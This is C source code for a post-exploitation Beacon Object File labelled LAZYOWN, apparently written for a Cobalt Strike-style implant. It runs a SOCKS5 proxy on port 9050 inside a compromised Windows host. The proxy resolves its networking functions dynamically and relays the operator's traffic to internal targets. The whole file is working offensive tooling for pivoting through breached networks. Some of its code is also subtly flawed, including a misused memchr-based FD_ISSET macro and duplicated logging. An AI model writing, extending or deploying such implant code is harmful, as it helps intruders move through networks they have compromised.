#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "beacon.h"

/* ===== DECLARACIONES QUE FALTABAN ===== */
typedef unsigned __int64 SOCKET;
#define INVALID_SOCKET  ((SOCKET)~0)
#define SOCKET_ERROR    (-1)
#define AF_INET         2
#define SOCK_STREAM     1
#define IPPROTO_TCP     6
#define INADDR_ANY      0x00000000
#define INADDR_LOOPBACK 0x7f000001

#pragma pack(push,1)
typedef struct WSAData {
    WORD wVersion;
    WORD wHighVersion;
    char szDescription[257];
    char szSystemStatus[129];
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char *lpVendorInfo;
} WSADATA, *LPWSADATA;
#pragma pack(pop)

typedef struct fd_set {
    unsigned int fd_count;
    SOCKET fd_array[64];
} fd_set;

typedef struct timeval {
    long tv_sec;
    long tv_usec;
} timeval;

#define FD_SETSIZE 64
#define FD_CLR(fd,set) do { if ((set)->fd_count > 0) { u_int __i;for (__i=0;__i<(set)->fd_count;__i++) { if ((set)->fd_array[__i] == (fd)) { while (__i < (set)->fd_count-1) { (set)->fd_array[__i] = (set)->fd_array[__i+1];__i++;} (set)->fd_count--;break;}}}} while(0)
#define FD_SET(fd,set)   do { if ((set)->fd_count < FD_SETSIZE) (set)->fd_array[(set)->fd_count++] = (fd); } while(0)
#define FD_ZERO(set)     (((set)->fd_count = 0))
#define FD_ISSET(fd,set) (__builtin_memchr((set)->fd_array,(fd),(set)->fd_count*sizeof(SOCKET))!=NULL)

typedef unsigned short u_short;
typedef unsigned int   u_int;
typedef unsigned long  u_long;

struct in_addr { u_long s_addr; };

struct sockaddr_in {
    short        sin_family;
    u_short      sin_port;
    struct in_addr sin_addr;
    char         sin_zero[8];
};

struct sockaddr { unsigned short sa_family; char sa_data[14]; };

struct hostent {
    char  *h_name;
    char **h_aliases;
    short  h_addrtype;
    short  h_length;
    char **h_addr_list;
#define h_addr h_addr_list[0]
};

/* ===== DIRECT IMPORTS ===== */
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_VirtualAlloc;
extern PVOID __imp_VirtualFree;
extern PVOID __imp_CloseHandle;

/* ===== CONSTANTES ===== */
#define SOCKS5_LISTEN_PORT 9050
#define SOCKS5_CONTROL_PORT 9051
#define MAX_PENDING_CONNECTIONS 5
#define BUFFER_SIZE 4096

/* ===== TIPOS DE FUNCIÓN ===== */
typedef HMODULE   (WINAPI *LOADLIBRARYA)(LPCSTR);
typedef FARPROC   (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID    (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL      (WINAPI *VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef HANDLE    (WINAPI *CREATE_EVENTA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef DWORD     (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
typedef HANDLE    (WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

/* --- red --- */
typedef int       (WINAPI *WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET    (WINAPI *SOCKETFN)(int, int, int);
typedef int       (WINAPI *BIND)(SOCKET, const struct sockaddr*, int);
typedef int       (WINAPI *LISTEN)(SOCKET, int);
typedef SOCKET    (WINAPI *ACCEPT)(SOCKET, struct sockaddr*, int*);
typedef int       (WINAPI *CONNECT)(SOCKET, const struct sockaddr*, int);
typedef int       (WINAPI *RECV)(SOCKET, char*, int, int);
typedef int       (WINAPI *SEND)(SOCKET, const char*, int, int);
typedef int       (WINAPI *SELECT)(int, fd_set*, fd_set*, fd_set*, const struct timeval*);
typedef int       (WINAPI *CLOSESOCKET)(SOCKET);
typedef int       (WINAPI *WSACLEANUP)(void);
typedef int       (WINAPI *WSAGETLASTERROR)(void);
typedef ULONG     (WINAPI *HTONL)(ULONG);
typedef USHORT    (WINAPI *HTONS)(USHORT);
typedef USHORT    (WINAPI *NTOHS)(USHORT);

/* ===== AUXILIARES ===== */
static int my_FD_ISSET(SOCKET s, fd_set *set) {
    if (!set) return 0;
    for (u_int i = 0; i < set->fd_count; ++i)
        if (set->fd_array[i] == s) return 1;
    return 0;
}

/* ===== VARIABLE GLOBAL ===== */
static HANDLE g_hShutdownEvent = NULL;

/* ===== MANEJADOR SOCKS5 (solo después de handshake confirmado) ===== */
static void HandleSocks5Connection(SOCKET client_sock,
    CONNECT pConnect, RECV pRecv, SEND pSend,
    WSAGETLASTERROR pWSAGetLastError,
    HTONL pHtonl, HTONS pHtons, NTOHS pNtohs) {

    char buf[BUFFER_SIZE];
    HMODULE hWs2_32 = ((LOADLIBRARYA)__imp_LoadLibraryA)("ws2_32.dll");
    if (!hWs2_32) return;
    CLOSESOCKET pCloseSocket = (CLOSESOCKET)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "closesocket");
    SELECT pSelect = (SELECT)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "select");
    if (!pCloseSocket || !pSelect) return;

    /* ---- Leemos solicitud completa ---- */
    int r = 0;
    while (r < 4) {
        int r2 = pRecv(client_sock, buf + r, 4 - r, 0);
        if (r2 <= 0) return;
        r += r2;
    }
    if (buf[0] != 0x05 || buf[1] != 0x01) {
        char rep[10] = {0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0};
        pSend(client_sock, rep, 10, 0);
        return;
    }

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;

    if (buf[3] == 0x01) { /* IPv4 */
        while (r < 10) {
            int r2 = pRecv(client_sock, buf + r, 10 - r, 0);
            if (r2 <= 0) return;
            r += r2;
        }
        dst.sin_addr.s_addr = *(ULONG*)(buf + 4);
        dst.sin_port = *(USHORT*)(buf + 8);
    } else if (buf[3] == 0x03) { /* Dominio */
        int r2 = pRecv(client_sock, buf + 4, 1, 0);
        if (r2 != 1) return;
        int dlen = (unsigned char)buf[4];
        if (dlen <= 0 || dlen >= BUFFER_SIZE - 6) return;
        int got = 0;
        while (got < dlen + 2) {
            r2 = pRecv(client_sock, buf + 5 + got, dlen + 2 - got, 0);
            if (r2 <= 0) return;
            got += r2;
        }
        buf[5 + dlen] = 0;
        typedef struct hostent* (WINAPI *GETHOSTBYNAME)(const char*);
        GETHOSTBYNAME pGetHostByName = (GETHOSTBYNAME)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "gethostbyname");
        if (!pGetHostByName) return;
        struct hostent *h = pGetHostByName(buf + 5);
        if (!h || !h->h_addr_list[0]) {
            char rep[10] = {0x05, 0x04, 0x00, 0x01, 0,0,0,0, 0,0};
            pSend(client_sock, rep, 10, 0);
            return;
        }
        dst.sin_addr.s_addr = *(ULONG*)h->h_addr_list[0];
        dst.sin_port = *(USHORT*)(buf + 5 + dlen);
    } else {
        char rep[10] = {0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0};
        pSend(client_sock, rep, 10, 0);
        return;
    }

    /* ---- Conectamos al destino ---- */
    SOCKETFN pSocketFn = (SOCKETFN)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "socket");
    if (!pSocketFn) return;
    SOCKET tgt = pSocketFn(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (tgt == INVALID_SOCKET) {
        char rep[10] = {0x05, 0x01, 0x00, 0x01, 0,0,0,0, 0,0};
        pSend(client_sock, rep, 10, 0);
        return;
    }
    if (pConnect(tgt, (struct sockaddr*)&dst, sizeof(dst)) == SOCKET_ERROR) {
        int err = pWSAGetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Falló conexión al destino. WSAError: %d\n", err);
        char rep[10] = {0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0};
        pSend(client_sock, rep, 10, 0);
        pCloseSocket(tgt);
        return;
    }

    /* ---- Respuesta de éxito ---- */
    char rep[10] = {0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0};
    if (pSend(client_sock, rep, 10, 0) != 10) {
        pCloseSocket(tgt);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Túnel establecido hacia %d.%d.%d.%d:%d\n",
        (dst.sin_addr.s_addr >> 0) & 0xFF,
        (dst.sin_addr.s_addr >> 8) & 0xFF,
        (dst.sin_addr.s_addr >> 16) & 0xFF,
        (dst.sin_addr.s_addr >> 24) & 0xFF,
        pNtohs(dst.sin_port));

    /* ---- Reenvío bidireccional ---- */
    while (1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(client_sock, &read_fds);
        FD_SET(tgt, &read_fds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        int sr = pSelect(0, &read_fds, NULL, NULL, &tv);
        if (sr <= 0) continue;
        if (g_hShutdownEvent) {
            DWORD (WINAPI *pWait)(HANDLE, DWORD) =
                (DWORD (WINAPI*)(HANDLE, DWORD))((GETPROCADDRESS)__imp_GetProcAddress)(
                    ((LOADLIBRARYA)__imp_LoadLibraryA)("kernel32.dll"), "WaitForSingleObject");
            if (pWait && pWait(g_hShutdownEvent, 0) == WAIT_OBJECT_0) break;
        }
        if (my_FD_ISSET(client_sock, &read_fds)) {
            int n = pRecv(client_sock, buf, BUFFER_SIZE, 0);
            if (n <= 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Cliente cerró conexión\n");
                break;
            }
            if (((SEND)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "send"))(tgt, buf, n, 0) != n) {
                BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Falló al reenviar al destino\n");
                break;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Reenviados %d bytes cliente→destino\n", n);
        }
        if (my_FD_ISSET(tgt, &read_fds)) {
            int n = pRecv(tgt, buf, BUFFER_SIZE, 0);
            if (n <= 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Destino cerró conexión\n");
                break;
            }
            if (pSend(client_sock, buf, n, 0) != n) {
                BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Falló al reenviar al cliente\n");
                break;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Reenviados %d bytes destino→cliente\n", n);
        }
    }
    pCloseSocket(tgt);
    BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Túnel cerrado\n");
}

/* ===== HILO PRINCIPAL DEL PROXY ===== */
DWORD WINAPI ProxyThread(LPVOID _) {
    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;
    GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)__imp_GetProcAddress;

    HMODULE hWs2_32 = pLoadLibraryA("ws2_32.dll");
    if (!hWs2_32) {
        BeaconPrintf(CALLBACK_ERROR, "[PROXY] No se pudo cargar ws2_32.dll\n");
        goto cleanup_event;
    }

    WSASTARTUP pWSAStartup = (WSASTARTUP)pGetProcAddress(hWs2_32, "WSAStartup");
    SOCKETFN pSocket = (SOCKETFN)pGetProcAddress(hWs2_32, "socket");
    BIND pBind = (BIND)pGetProcAddress(hWs2_32, "bind");
    LISTEN pListen = (LISTEN)pGetProcAddress(hWs2_32, "listen");
    ACCEPT pAccept = (ACCEPT)pGetProcAddress(hWs2_32, "accept");
    CONNECT pConnect = (CONNECT)pGetProcAddress(hWs2_32, "connect");
    RECV pRecv = (RECV)pGetProcAddress(hWs2_32, "recv");
    SEND pSend = (SEND)pGetProcAddress(hWs2_32, "send");
    SELECT pSelect = (SELECT)pGetProcAddress(hWs2_32, "select");
    CLOSESOCKET pCloseSocket = (CLOSESOCKET)pGetProcAddress(hWs2_32, "closesocket");
    WSACLEANUP pWSACleanup = (WSACLEANUP)pGetProcAddress(hWs2_32, "WSACleanup");
    WSAGETLASTERROR pWSAGetLastError = (WSAGETLASTERROR)pGetProcAddress(hWs2_32, "WSAGetLastError");
    HTONL pHtonl = (HTONL)pGetProcAddress(hWs2_32, "htonl");
    HTONS pHtons = (HTONS)pGetProcAddress(hWs2_32, "htons");
    NTOHS pNtohs = (NTOHS)pGetProcAddress(hWs2_32, "ntohs");

    if (!pWSAStartup || !pSocket || !pBind || !pListen || !pAccept || !pConnect ||
        !pRecv || !pSend || !pSelect || !pCloseSocket || !pWSACleanup ||
        !pWSAGetLastError || !pHtonl || !pHtons || !pNtohs) {
        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Función de red no resuelta\n");
        goto cleanup_event;
    }

    WSADATA wsa;
    if (pWSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[PROXY] WSAStartup falló\n");
        goto cleanup_event;
    }

    SOCKET srv = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (srv == INVALID_SOCKET) goto cleanup_wsa;

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = pHtonl(INADDR_ANY);
    sa.sin_port = pHtons(SOCKS5_LISTEN_PORT);

    if (pBind(srv, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Bind %d falló\n", SOCKS5_LISTEN_PORT);
        goto cleanup_srv;
    }
    if (pListen(srv, MAX_PENDING_CONNECTIONS) == SOCKET_ERROR) goto cleanup_srv;

    BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Escuchando 0.0.0.0:%d\n", SOCKS5_LISTEN_PORT);

    /* ---- Bucle de accept ---- */
    while (1) {
        SOCKET cli = pAccept(srv, NULL, NULL);
        if (cli == INVALID_SOCKET) continue;

        /* ---- Leemos y respondemos INMEDIATAMENTE ---- */
        unsigned char raw[4] = {0};
        int rr = pRecv(cli, (char*)raw, 4, 0);
        BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] RAW recv: %02X %02X %02X %02X (rr=%d)\n", raw[0], raw[1], raw[2], raw[3], rr);

        if (rr <= 0) {
            if (rr == 0) BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Cliente cerró conexión (FIN)\n");
            else BeaconPrintf(CALLBACK_ERROR, "[PROXY] recv() error, cerrando\n");
            pCloseSocket(cli);
            continue;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] RAW recv: %02X %02X %02X %02X (rr=%d)\n", raw[0], raw[1], raw[2], raw[3], rr);

        if (raw[0] == 0x05) {
            char resp[2] = {0x05, 0x00};
            pSend(cli, resp, 2, 0);
            BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Respondido 05 00\n");
            HandleSocks5Connection(cli, pConnect, pRecv, pSend, pWSAGetLastError, pHtonl, pHtons, pNtohs);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[PROXY] Handshake inválido, cerrando\n");
            pCloseSocket(cli);
        }
    }

cleanup_srv:
    pCloseSocket(srv);
cleanup_wsa:
    pWSACleanup();
cleanup_event:
    if (g_hShutdownEvent) {
        ((BOOL (WINAPI*)(HANDLE))__imp_CloseHandle)(g_hShutdownEvent);
        g_hShutdownEvent = NULL;
    }
    return 0;
}

/* ===== ENTRY POINT BOF ===== */
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] Iniciando BOF SOCKS5\n");

    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;
    GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)__imp_GetProcAddress;

    HMODULE hK32 = pLoadLibraryA("kernel32.dll");
    if (!hK32) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] No se pudo cargar kernel32.dll\n");
        return;
    }
    CREATE_EVENTA pCreateEventA = (CREATE_EVENTA)pGetProcAddress(hK32, "CreateEventA");
    WAITFORSINGLEOBJECT pWaitForSingleObject = (WAITFORSINGLEOBJECT)pGetProcAddress(hK32, "WaitForSingleObject");
    CREATETHREAD pCreateThread = (CREATETHREAD)pGetProcAddress(hK32, "CreateThread");
    typedef BOOL (WINAPI *CLOSEHANDLE)(HANDLE);
    CLOSEHANDLE pCloseHandle = (CLOSEHANDLE)pGetProcAddress(hK32, "CloseHandle");

    if (!pCreateEventA || !pWaitForSingleObject || !pCreateThread || !pCloseHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Función crítica no resuelta\n");
        return;
    }

    g_hShutdownEvent = pCreateEventA(NULL, TRUE, FALSE, NULL);
    if (!g_hShutdownEvent) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Falló CreateEventA\n");
        return;
    }

    HANDLE hT = pCreateThread(NULL, 0, ProxyThread, NULL, 0, NULL);
    if (!hT) {
        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Falló CreateThread\n");
        pCloseHandle(g_hShutdownEvent);
        g_hShutdownEvent = NULL;
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] Proxy ejecutándose 0.0.0.0:%d\n", SOCKS5_LISTEN_PORT);
    pWaitForSingleObject(g_hShutdownEvent, INFINITE);
    pCloseHandle(hT);
    pCloseHandle(g_hShutdownEvent);
    g_hShutdownEvent = NULL;
    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] BOF finalizado\n");
}